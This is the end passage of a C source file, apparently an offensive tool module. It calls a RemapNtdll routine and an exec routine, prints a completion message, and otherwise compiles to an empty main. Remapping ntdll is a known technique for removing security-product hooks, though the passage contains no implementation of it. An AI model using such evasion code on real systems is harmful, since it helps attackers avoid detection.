        RemapNtdll(debug);
        exec(1, debug);
    }

	internal_printf("[i] Done\n");

	printoutput(TRUE);

}

#else


int main(int args, const char* argv[])
{

	return 0;
}

#endif